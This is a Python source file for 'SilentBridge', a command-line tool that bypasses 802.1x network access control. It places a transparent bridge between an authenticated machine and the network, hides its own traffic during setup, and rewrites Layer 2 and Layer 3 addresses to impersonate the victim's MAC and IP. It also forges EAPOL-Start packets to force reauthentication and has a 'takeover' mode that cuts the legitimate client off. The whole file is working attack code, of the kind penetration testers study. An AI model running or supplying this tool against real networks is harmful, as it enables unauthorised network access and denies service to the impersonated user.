#!/usr/bin/env python3

import os
import time
import argparse
import subprocess
import netifaces
import sys
from scapy.all import Ether, EAPOL, sendp

class SilentBridge:
    def __init__(self):
        self.parser = self._create_parser()
        self.args = None
        # Check if running as root
        if os.geteuid() != 0:
            print("[!] This script must be run as root!")
            sys.exit(1)
    
    def _create_parser(self):
        parser = argparse.ArgumentParser(description='SilentBridge - 802.1x Bypass Tool')
        
        subparsers = parser.add_subparsers(dest='command', help='Commands')
        
        # Create bridge command
        create_parser = subparsers.add_parser('create', help='Create a transparent bridge')
        create_parser.add_argument('--bridge', required=True, help='Bridge interface name')
        create_parser.add_argument('--phy', required=True, help='Interface connected to the client (the computer that authenticates itself)')
        create_parser.add_argument('--upstream', required=True, help='Upstream interface - The interface connected to the network/router')
        create_parser.add_argument('--sidechannel', required=True, help='Side channel interface for management')
        create_parser.add_argument('--egress-port', type=int, default=22, help='Egress port for side channel')
        create_parser.add_argument('--use-legacy', action='store_true', help='Use legacy iptables instead of nf_tables')
        
        # Destroy bridge command
        destroy_parser = subparsers.add_parser('destroy', help='Destroy a bridge')
        destroy_parser.add_argument('--bridge', required=True, help='Bridge interface name')
        
        # Add interaction command
        interact_parser = subparsers.add_parser('interact', help='Add interaction to bridge')
        interact_parser.add_argument('--bridge', required=True, help='Bridge interface name')
        interact_parser.add_argument('--phy', required=True, help='Interface connected to the client (the computer that authenticates itself)')
        interact_parser.add_argument('--upstream', required=True, help='Upstream interface')
        interact_parser.add_argument('--sidechannel', required=True, help='Side channel interface for management')
        interact_parser.add_argument('--egress-port', type=int, default=22, help='Egress port for side channel')
        interact_parser.add_argument('--client-mac', required=True, help='Client MAC address to impersonate')
        interact_parser.add_argument('--client-ip', required=True, help='Client IP address to impersonate')
        interact_parser.add_argument('--gw-mac', required=True, help='Gateway MAC address')
        interact_parser.add_argument('--use-legacy', action='store_true', help='Use legacy iptables instead of nf_tables')
        
        # Force reauthentication command
        reauth_parser = subparsers.add_parser('reauth', help='Force 802.1x reauthentication')
        reauth_parser.add_argument('--interface', required=True, help='Interface to send EAPOL-Start from')
        reauth_parser.add_argument('--client-mac', required=True, help='Client MAC address to impersonate')
        
        # Takeover command
        takeover_parser = subparsers.add_parser('takeover', help='Take over client connection by creating a virtual interface')
        takeover_parser.add_argument('--bridge', required=True, help='Bridge interface name')
        takeover_parser.add_argument('--phy', required=True, help='Physical interface to remove from bridge')
        takeover_parser.add_argument('--client-mac', required=True, help='Client MAC address to impersonate')
        takeover_parser.add_argument('--client-ip', required=True, help='Client IP address to impersonate')
        takeover_parser.add_argument('--netmask', default='255.255.255.0', help='Network mask for client IP')
        takeover_parser.add_argument('--gateway-ip', required=True, help='Gateway IP address')
        takeover_parser.add_argument('--veth-name', default='veth0', help='Name for the virtual ethernet device')
        
        return parser
    
    def run(self):
        self.args = self.parser.parse_args()
        
        if self.args.command == 'create':
            self.create_transparent_bridge()
        elif self.args.command == 'destroy':
            self.destroy_bridge()
        elif self.args.command == 'interact':
            self.add_interaction()
        elif self.args.command == 'reauth':
            self.force_reauthentication()
        elif self.args.command == 'takeover':
            self.takeover_client()
        else:
            self.parser.print_help()
    
    def run_command(self, command, shell=False, ignore_errors=False):
        """Run a shell command and return output"""
        try:
            if shell:
                result = subprocess.run(command, shell=True, check=not ignore_errors, 
                                       stdout=subprocess.PIPE, stderr=subprocess.PIPE, 
                                       universal_newlines=True)
            else:
                result = subprocess.run(command.split(), check=not ignore_errors, 
                                       stdout=subprocess.PIPE, stderr=subprocess.PIPE, 
                                       universal_newlines=True)
            return result.stdout
        except subprocess.CalledProcessError as e:
            if not ignore_errors:
                print(f"Command failed: {e}")
                print(f"Error output: {e.stderr}")
            return None
    
    def check_command_exists(self, command):
        """Check if a command exists in the system"""
        try:
            subprocess.run(["which", command], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            return True
        except subprocess.CalledProcessError:
            return False
    
    def check_interface_exists(self, interface):
        """Check if an interface exists"""
        return os.path.exists(f"/sys/class/net/{interface}")
    
    def check_interface_in_bridge(self, bridge, interface):
        """Check if an interface is already in a bridge"""
        if not os.path.exists(f"/sys/devices/virtual/net/{bridge}/brif"):
            return False
        
        try:
            bridge_interfaces = os.listdir(f"/sys/devices/virtual/net/{bridge}/brif")
            return interface in bridge_interfaces
        except:
            return False
    
    def write_sysfs(self, path, value):
        """Safely write to sysfs files"""
        if not os.path.exists(path):
            print(f"[!] Warning: Path {path} does not exist")
            return False
        
        try:
            # Handle hexadecimal values properly
            if isinstance(value, str) and value.startswith("0x"):
                # Convert hex string to integer
                int_value = int(value, 16)
                value = str(int_value)
            
            with open(path, 'w') as f:
                f.write(str(value))
            return True
        except Exception as e:
            print(f"[!] Warning: Could not write to {path}: {e}")
            return False
    
    def make_bridge_transparent(self, bridge_name):
        """Configure bridge to be completely transparent"""
        print("[*] Making bridge completely transparent...")
        
        # Disable STP on the bridge
        self.run_command(f"brctl stp {bridge_name} off", ignore_errors=True)
        
        # Set bridge ageing time to 0 (don't age out entries)
        self.run_command(f"brctl setageing {bridge_name} 0", ignore_errors=True)
        
        # Disable multicast snooping
        if os.path.exists(f"/sys/devices/virtual/net/{bridge_name}/bridge/multicast_snooping"):
            self.write_sysfs(f"/sys/devices/virtual/net/{bridge_name}/bridge/multicast_snooping", "0")
        
        # Set forward delay to 0
        self.run_command(f"brctl setfd {bridge_name} 0", ignore_errors=True)
        
        # Enable promiscuous mode on the bridge
        self.run_command(f"ip link set {bridge_name} promisc on", ignore_errors=True)
        
        # Set group_fwd_mask to forward all BPDUs and other reserved addresses
        # Try different methods to set this value
        if os.path.exists(f"/sys/class/net/{bridge_name}/bridge/group_fwd_mask"):
            try:
                # Try direct command first
                self.run_command(f"echo 65535 > /sys/class/net/{bridge_name}/bridge/group_fwd_mask", shell=True, ignore_errors=True)
            except:
                # Then try our write_sysfs method
                self.write_sysfs(f"/sys/class/net/{bridge_name}/bridge/group_fwd_mask", "65535")
        
        # Disable IGMP snooping if available
        if os.path.exists(f"/sys/devices/virtual/net/{bridge_name}/bridge/multicast_igmp_version"):
            try:
                # Try direct command first
                self.run_command(f"echo 0 > /sys/devices/virtual/net/{bridge_name}/bridge/multicast_igmp_version", shell=True, ignore_errors=True)
            except:
                # Then try our write_sysfs method
                self.write_sysfs(f"/sys/devices/virtual/net/{bridge_name}/bridge/multicast_igmp_version", "0")
        
        # Disable bridge learning
        if os.path.exists(f"/sys/devices/virtual/net/{bridge_name}/brif"):
            for iface in os.listdir(f"/sys/devices/virtual/net/{bridge_name}/brif"):
                if os.path.exists(f"/sys/devices/virtual/net/{bridge_name}/brif/{iface}/learning"):
                    self.write_sysfs(f"/sys/devices/virtual/net/{bridge_name}/brif/{iface}/learning", "0")
    
    def get_iptables_command(self, command, use_legacy=None):
        """Get the appropriate iptables command (legacy or nf_tables)"""
        if use_legacy is None:
            use_legacy = getattr(self.args, 'use_legacy', False)
        
        if use_legacy:
            if command == "iptables":
                return "iptables-legacy"
            elif command == "ebtables":
                return "ebtables-legacy"
            elif command == "arptables":
                return "arptables-legacy"
        
        return command
    
    def create_transparent_bridge(self):
        """Create a transparent bridge without interaction"""
        print("[*] Creating transparent bridge...")
        
        # Check if interfaces exist
        for iface in [self.args.phy, self.args.upstream, self.args.sidechannel]:
            if not self.check_interface_exists(iface):
                print(f"[!] Interface {iface} does not exist!")
                return
        
        # Check if macchanger is installed
        if not self.check_command_exists("macchanger"):
            print("[!] macchanger is not installed. Please install it with 'apt-get install macchanger'")
            print("[*] Continuing without MAC address change...")
        
        # Get upstream MAC address
        try:
            upstream_mac = netifaces.ifaddresses(self.args.upstream)[netifaces.AF_LINK][0]['addr']
            print(f"[*] Upstream MAC address: {upstream_mac}")
        except (KeyError, IndexError):
            print(f"[!] Could not get MAC address for {self.args.upstream}")
            upstream_mac = None
        
        # Load br_netfilter kernel module
        print("[*] Making sure br_netfilter kernel module is loaded...")
        self.run_command("modprobe br_netfilter", ignore_errors=True)
        
        # Disable IPv6
        print("[*] Disabling IPv6...")
        self.write_sysfs("/proc/sys/net/ipv6/conf/all/disable_ipv6", "1")
        
        # Reset firewall rules
        print("[*] Resetting firewall rules...")
        iptables_cmd = self.get_iptables_command("iptables")
        ebtables_cmd = self.get_iptables_command("ebtables")
        arptables_cmd = self.get_iptables_command("arptables")
        
        self.run_command(f"{iptables_cmd} -F", ignore_errors=True)
        self.run_command(f"{ebtables_cmd} -F", ignore_errors=True)
        self.run_command(f"{arptables_cmd} -F", ignore_errors=True)
        
        # Check if bridge already exists
        if self.check_interface_exists(self.args.bridge):
            print(f"[*] Bridge {self.args.bridge} already exists, skipping creation...")
        else:
            # Create the bridge
            print(f"[*] Creating bridge {self.args.bridge}...")
            self.run_command(f"brctl addbr {self.args.bridge}")
        
        # Make the bridge completely transparent
        self.make_bridge_transparent(self.args.bridge)
        
        # Enable 802.1x forwarding
        print("[*] Enabling 802.1x forwarding...")
        if os.path.exists(f"/sys/class/net/{self.args.bridge}/bridge/group_fwd_mask"):
            try:
                # Try direct command first
                self.run_command(f"echo 8 > /sys/class/net/{self.args.bridge}/bridge/group_fwd_mask", shell=True, ignore_errors=True)
            except:
                # Then try our write_sysfs method
                self.write_sysfs(f"/sys/class/net/{self.args.bridge}/bridge/group_fwd_mask", "8")
        
        # Enable IP forwarding
        print("[*] Enabling IP forwarding...")
        self.write_sysfs("/proc/sys/net/ipv4/ip_forward", "1")
        
        # Add interfaces to the bridge if not already added
        print("[*] Adding interfaces to the bridge...")
        for iface in [self.args.phy, self.args.upstream]:
            if self.check_interface_in_bridge(self.args.bridge, iface):
                print(f"[*] Interface {iface} is already in bridge {self.args.bridge}, skipping...")
            else:
                self.run_command(f"brctl addif {self.args.bridge} {iface}", ignore_errors=True)
        
        # Bring both sides of the bridge up
        print("[*] Bringing interfaces up in promiscuous mode...")
        self.run_command(f"ifconfig {self.args.phy} 0.0.0.0 up promisc", ignore_errors=True)
        self.run_command(f"ifconfig {self.args.upstream} 0.0.0.0 up promisc", ignore_errors=True)
        
        time.sleep(2)
        
        # Initiate radio silence
        print("[*] Initiating radio silence...")
        try:
            self.run_command(f"{iptables_cmd} -A OUTPUT -o {self.args.sidechannel} -p tcp --dport {self.args.egress_port} -j ACCEPT", ignore_errors=True)
            self.run_command(f"{iptables_cmd} -I INPUT -i {self.args.sidechannel} -m state --state ESTABLISHED,RELATED -j ACCEPT", ignore_errors=True)
            self.run_command(f"{arptables_cmd} -A OUTPUT -o {self.args.sidechannel} -j ACCEPT", ignore_errors=True)
            self.run_command(f"{iptables_cmd} -A OUTPUT -j DROP", ignore_errors=True)
            self.run_command(f"{arptables_cmd} -A OUTPUT -j DROP", ignore_errors=True)
        except Exception as e:
            print(f"[!] Warning: Could not set up firewall rules: {e}")
        
        # Bring the bridge up
        print("[*] Bringing the bridge up...")
        if self.check_command_exists("macchanger") and upstream_mac:
            self.run_command(f"macchanger -m {upstream_mac} {self.args.bridge}", ignore_errors=True)
        
        self.run_command(f"ifconfig {self.args.bridge} 0.0.0.0 up promisc", ignore_errors=True)
        
        # Lift radio silence
        print("[*] Lifting radio silence...")
        try:
            self.run_command(f"{iptables_cmd} -D OUTPUT -j DROP", ignore_errors=True)
            self.run_command(f"{arptables_cmd} -D OUTPUT -j DROP", ignore_errors=True)
        except Exception as e:
            print(f"[!] Warning: Could not lift radio silence: {e}")
        
        # Reset the links
        print("[*] Resetting the links...")
        self.run_command(f"ethtool -r {self.args.upstream}", ignore_errors=True)
        self.run_command(f"ethtool -r {self.args.phy}", ignore_errors=True)
        
        print("[+] Bridge created successfully!")
    
    def destroy_bridge(self):
        """Destroy the bridge and free all interfaces"""
        print(f"[*] Destroying bridge {self.args.bridge}...")
        
        # Check if the bridge exists
        if not self.check_interface_exists(self.args.bridge):
            print(f"[!] Bridge {self.args.bridge} does not exist!")
            return
        
        try:
            # Get all interfaces in the bridge
            if os.path.exists(f"/sys/devices/virtual/net/{self.args.bridge}/brif"):
                bridge_interfaces = os.listdir(f"/sys/devices/virtual/net/{self.args.bridge}/brif")
                
                # Bring down all interfaces
                print("[*] Bringing down all interfaces...")
                for iface in bridge_interfaces:
                    self.run_command(f"ifconfig {iface} down", ignore_errors=True)
            else:
                bridge_interfaces = []
                print("[*] No interfaces found in the bridge")
            
            # Bring down the bridge
            print("[*] Bringing down the bridge...")
            self.run_command(f"ifconfig {self.args.bridge} down", ignore_errors=True)
            
            # Remove interfaces from the bridge
            print("[*] Removing interfaces from the bridge...")
            for iface in bridge_interfaces:
                self.run_command(f"brctl delif {self.args.bridge} {iface}", ignore_errors=True)
            
            # Delete the bridge
            print("[*] Deleting the bridge...")
            self.run_command(f"brctl delbr {self.args.bridge}", ignore_errors=True)
            
            print("[+] Bridge destroyed successfully!")
            
        except Exception as e:
            print(f"[!] Error: {e}")
    
    def add_interaction(self):
        """Add interaction to transparent bridge"""
        print("[*] Adding interaction to bridge...")
        
        # Check if bridge exists
        if not self.check_interface_exists(self.args.bridge):
            print(f"[!] Bridge {self.args.bridge} does not exist!")
            return
        
        # Check if interfaces exist
        for iface in [self.args.phy, self.args.upstream, self.args.sidechannel]:
            if not self.check_interface_exists(iface):
                print(f"[!] Interface {iface} does not exist!")
                return
        
        # Get upstream MAC address
        try:
            upstream_mac = netifaces.ifaddresses(self.args.upstream)[netifaces.AF_LINK][0]['addr']
            print(f"[*] Upstream MAC address: {upstream_mac}")
        except (KeyError, IndexError):
            print(f"[!] Could not get MAC address for {self.args.upstream}")
            upstream_mac = None
            return
        
        # Make sure br_netfilter is loaded
        print("[*] Making sure br_netfilter kernel module is loaded...")
        self.run_command("modprobe br_netfilter", ignore_errors=True)
        
        # Disable IPv6
        print("[*] Disabling IPv6...")
        self.write_sysfs("/proc/sys/net/ipv6/conf/all/disable_ipv6", "1")
        
        # Make sure the bridge is completely transparent
        self.make_bridge_transparent(self.args.bridge)
        
        # Get iptables commands
        iptables_cmd = self.get_iptables_command("iptables")
        ebtables_cmd = self.get_iptables_command("ebtables")
        arptables_cmd = self.get_iptables_command("arptables")
        
        # Initiate radio silence
        print("[*] Initiating radio silence...")
        try:
            self.run_command(f"{iptables_cmd} -A OUTPUT -o {self.args.sidechannel} -p tcp --dport {self.args.egress_port} -j ACCEPT", ignore_errors=True)
            self.run_command(f"{iptables_cmd} -I INPUT -i {self.args.sidechannel} -m state --state ESTABLISHED,RELATED -j ACCEPT", ignore_errors=True)
            self.run_command(f"{arptables_cmd} -A OUTPUT -o {self.args.sidechannel} -j ACCEPT", ignore_errors=True)
            self.run_command(f"{iptables_cmd} -A OUTPUT -j DROP", ignore_errors=True)
            self.run_command(f"{arptables_cmd} -A OUTPUT -j DROP", ignore_errors=True)
        except Exception as e:
            print(f"[!] Warning: Could not set up firewall rules: {e}")
        
        time.sleep(3)
        
        # Bring the bridge up with a specific IP
        print("[*] Bringing the bridge up...")
        self.run_command(f"ifconfig {self.args.bridge} 169.254.66.66 up promisc", ignore_errors=True)
        
        time.sleep(3)
        
        # Establish Layer 2 source NAT
        print("[*] Establishing Layer 2 source NAT...")
        try:
            self.run_command(f"{ebtables_cmd} -t nat -A POSTROUTING -s {upstream_mac} -o {self.args.upstream} -j snat --to-src {self.args.client_mac}", ignore_errors=True)
            self.run_command(f"{ebtables_cmd} -t nat -A POSTROUTING -s {upstream_mac} -o {self.args.bridge} -j snat --to-src {self.args.client_mac}", ignore_errors=True)
        except Exception as e:
            print(f"[!] Warning: Could not set up Layer 2 NAT: {e}")
        
        time.sleep(3)
        
        # Set default gateway and static ARP entry
        print("[*] Setting default gateway and static ARP entry...")
        self.run_command(f"arp -s -i {self.args.bridge} 169.254.66.1 {self.args.gw_mac}", ignore_errors=True)
        self.run_command("route add default gw 169.254.66.1", ignore_errors=True)
        
        time.sleep(3)
        
        # Establish Layer 3 source NAT
        print("[*] Establishing Layer 3 source NAT...")
        try:
            self.run_command(f"{iptables_cmd} -t nat -A POSTROUTING -o {self.args.bridge} -s 169.254.66.66 -p tcp -j SNAT --to {self.args.client_ip}:61000-62000", ignore_errors=True)
            self.run_command(f"{iptables_cmd} -t nat -A POSTROUTING -o {self.args.bridge} -s 169.254.66.66 -p udp -j SNAT --to {self.args.client_ip}:61000-62000", ignore_errors=True)
            self.run_command(f"{iptables_cmd} -t nat -A POSTROUTING -o {self.args.bridge} -s 169.254.66.66 -p icmp -j SNAT --to {self.args.client_ip}", ignore_errors=True)
        except Exception as e:
            print(f"[!] Warning: Could not set up Layer 3 NAT: {e}")
        
        time.sleep(3)
        
        # Lift radio silence
        print("[*] Lifting radio silence...")
        try:
            self.run_command(f"{iptables_cmd} -D OUTPUT -j DROP", ignore_errors=True)
            self.run_command(f"{arptables_cmd} -D OUTPUT -j DROP", ignore_errors=True)
        except Exception as e:
            print(f"[!] Warning: Could not lift radio silence: {e}")
        
        print("[+] Interaction added successfully!")
    
    def force_reauthentication(self):
        """Force 802.1x reauthentication by sending EAPOL-Start packet"""
        print(f"[*] Forcing reauthentication for {self.args.client_mac}...")
        
        # Check if interface exists
        if not self.check_interface_exists(self.args.interface):
            print(f"[!] Interface {self.args.interface} does not exist!")
            return
        
        # Send EAPOL-Start packet
        try:
            sendp(Ether(src=self.args.client_mac, dst="01:80:c2:00:00:03")/EAPOL(type=1), 
                  iface=self.args.interface)
            print("[+] EAPOL-Start packet sent successfully!")
        except Exception as e:
            print(f"[!] Error sending EAPOL-Start packet: {e}")
    
    def takeover_client(self):
        """Take over client connection by removing phy interface from bridge and creating a virtual interface"""
        print("[*] Starting client takeover operation...")
        
        try:
            # Check if the bridge exists
            if not self.check_interface_exists(self.args.bridge):
                print(f"[!] Bridge {self.args.bridge} does not exist!")
                return
            
            # Check if the physical interface is in the bridge
            if not self.check_interface_in_bridge(self.args.bridge, self.args.phy):
                print(f"[!] Physical interface {self.args.phy} is not in bridge {self.args.bridge}!")
                return
            
            # Remove the physical interface from the bridge
            print(f"[*] Removing {self.args.phy} from bridge {self.args.bridge}...")
            self.run_command(f"ifconfig {self.args.phy} down", ignore_errors=True)
            self.run_command(f"brctl delif {self.args.bridge} {self.args.phy}", ignore_errors=True)
            
            # Check if the virtual interface already exists and remove it if it does
            if self.check_interface_exists(self.args.veth_name):
                print(f"[*] Virtual interface {self.args.veth_name} already exists, removing it...")
                self.run_command(f"ip link delete {self.args.veth_name}", ignore_errors=True)
            
            # Create a virtual ethernet device
            print(f"[*] Creating virtual ethernet device {self.args.veth_name}...")
            self.run_command(f"ip link add {self.args.veth_name} type veth peer name {self.args.veth_name}_peer", ignore_errors=True)
            
            # Add the virtual interface to the bridge
            print(f"[*] Adding {self.args.veth_name}_peer to bridge {self.args.bridge}...")
            self.run_command(f"brctl addif {self.args.bridge} {self.args.veth_name}_peer", ignore_errors=True)
            self.run_command(f"ifconfig {self.args.veth_name}_peer up promisc", ignore_errors=True)
            
            # Make sure the bridge is still completely transparent
            self.make_bridge_transparent(self.args.bridge)
            
            # Set the MAC address of the virtual interface to the client's MAC
            print(f"[*] Setting MAC address of {self.args.veth_name} to {self.args.client_mac}...")
            self.run_command(f"ifconfig {self.args.veth_name} down", ignore_errors=True)
            
            if self.check_command_exists("macchanger"):
                self.run_command(f"macchanger -m {self.args.client_mac} {self.args.veth_name}", ignore_errors=True)
            else:
                print("[!] macchanger is not installed. Please install it with 'apt-get install macchanger'")
                print("[*] Trying to set MAC address using ip command...")
                self.run_command(f"ip link set dev {self.args.veth_name} address {self.args.client_mac}", ignore_errors=True)
            
            # Configure the virtual interface with the client's IP
            print(f"[*] Configuring {self.args.veth_name} with client IP {self.args.client_ip}...")
            self.run_command(f"ifconfig {self.args.veth_name} {self.args.client_ip} netmask {self.args.netmask} up promisc", ignore_errors=True)
            
            # Add default route
            print(f"[*] Setting default gateway to {self.args.gateway_ip}...")
            # First delete any existing default routes
            self.run_command("ip route del default", ignore_errors=True)
            
            self.run_command(f"ip route add default via {self.args.gateway_ip} dev {self.args.veth_name}", ignore_errors=True)
            
            # Enable IP forwarding
            print("[*] Enabling IP forwarding...")
            self.write_sysfs("/proc/sys/net/ipv4/ip_forward", "1")
            
            # Reset the link
            print("[*] Resetting the link...")
            self.run_command(f"ethtool -r {self.args.veth_name}", ignore_errors=True)
            
            print(f"[+] Takeover complete! The system is now using {self.args.veth_name} with client's MAC and IP.")
            print(f"[+] The client has been disconnected from the network.")
            
        except Exception as e:
            print(f"[!] Error during takeover: {e}")

if __name__ == "__main__":
    bridge = SilentBridge()
    bridge.run() 